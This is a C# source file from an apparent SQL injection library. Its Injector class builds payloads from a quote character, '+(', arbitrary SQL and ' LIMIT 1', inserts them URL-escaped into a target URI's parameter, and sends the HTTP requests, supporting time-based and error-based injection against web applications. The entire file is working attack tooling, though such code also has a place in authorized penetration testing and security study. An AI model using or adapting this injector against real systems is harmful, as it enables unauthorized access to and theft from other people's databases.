using System;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PeterJuhasz.SqlInjection
{
    public class Injector : ITimeBasedInjector, IErrorBasedInjector
    {
        public Injector(InjectionOptions options, HttpClient http)
        {
            Options = options;
            Http = http;
        }

        public InjectionOptions Options { get; }
        public HttpClient Http { get; }


        Task ITimeBasedInjector.InjectAsync(string sql, CancellationToken cancellationToken) =>
            InjectAsync(sql, cancellationToken);

        public Task<HttpResponseMessage> InjectAsync(string sql, CancellationToken cancellationToken)
        {
            // construct uri
            string uri = GetUri(sql);

            using (var request = new HttpRequestMessage(Options.Method, uri))
            using (var content = GetContent(sql))
            {
                request.Content = content;

                return Http.SendAsync(request);
            }
        }

        private HttpContent GetContent(string sql)
        {
            return Options.ContentFactory();
        }

        private string GetUri(string sql)
        {
            return Options.Uri.ToString().Replace($"{{{Options.ParameterName}}}", Uri.EscapeDataString(GetSql(sql)));
        }

        protected string GetSql(string sql)
        {
            StringBuilder sb = new StringBuilder();

            if (this.Options.InitialValue != null)
                sb.Append(this.Options.InitialValue);

            if (this.Options.QuoteStyle != null)
                sb.Append(this.Options.QuoteStyle.Value.ToChar());

            sb.Append('+');
            sb.Append('(');
            sb.Append(sql);
            sb.Append(')');
            sb.Append(" LIMIT 1");

            return sb.ToString();
        }
    }
}
